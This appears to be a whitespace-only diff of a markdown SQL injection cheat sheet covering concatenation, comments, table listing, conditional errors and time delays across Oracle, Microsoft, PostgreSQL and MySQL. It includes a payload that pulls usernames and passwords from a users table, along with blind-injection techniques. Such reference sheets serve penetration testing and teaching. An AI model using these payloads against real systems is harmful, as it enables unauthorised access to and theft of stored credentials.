@@ -15,15 +15,15 @@ SELECT 'A','B' FROM dual
 In order to get multiple results in one column.
 ```
 Oracle,PostgreSQL				'foo'||'bar'
-Microsoft						'foo'+'bar'
-MySQL							'foo' 'bar' or CONCAT('foo','bar')
+Microsoft					'foo'+'bar'
+MySQL						'foo' 'bar' or CONCAT('foo','bar')
 ```
 
 ### Comments
 ```
-Oracle  						--comment
-Microsoft,PostgreSQL			--comment or /*comment*/
-MySQL							#comment or -- comment or /*comment*/				
+Oracle  					--comment
+Microsoft,PostgreSQL				--comment or /*comment*/
+MySQL						#comment or -- comment or /*comment*/				
 ```
 
 ### Substring
@@ -38,10 +38,10 @@ All databases have a function for string length: `LENGTH()`
 
 ### List Tables & Columns
 ```
-Oracle 				 SELECT * FROM all_tables
+Oracle 				 		SELECT * FROM all_tables
 						SELECT * FROM all_tab_columns WHERE table_name=''
 
-All others		  	SELECT * FROM information_schema.tables
+All others		  			SELECT * FROM information_schema.tables
 						SELECT * FROM information_schema.columns WHERE table_name = ''
 ```
 
@@ -69,9 +69,9 @@ UNION SELECT username, password FROM users
 ### Conditional Errors
 ```
 Oracle 		SELECT CASE WHEN (1=1) THEN to_char(1/0) ELSE NULL END FROM dual
-Microsoft	  SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END
-PostgreSQL	 SELECT CASE WHEN (1=1) THEN cast(1/0 as text) ELSE NULL END
-MySQL		  SELECT IF(1=1, SELECT table_name FROM information_schema.tables, 'a')
+Microsoft	SELECT CASE WHEN (1=1) THEN 1/0 ELSE NULL END
+PostgreSQL	SELECT CASE WHEN (1=1) THEN cast(1/0 as text) ELSE NULL END
+MySQL		SELECT IF(1=1, SELECT table_name FROM information_schema.tables, 'a')
 ```
 
 MySQL IF() syntax: SELECT IF(condition, case_true, case_false)
@@ -80,9 +80,9 @@ MySQL IF() syntax: SELECT IF(condition, case_true, case_false)
 Sleep for 10 seconds.
 ```
 Oracle	  	dbms_pipe.receive_message(('a'),10)
-Microsoft  	 WAITFOR DELAY '0:0:10'
+Microsoft  	WAITFOR DELAY '0:0:10'
 PostgreSQL  	SELECT pg_sleep(10)
-MySQL		   SELECT sleep(10)
+MySQL		SELECT sleep(10)
 ```
 In Oracle, a concatenation of strings is required for a conditional time delay:
 
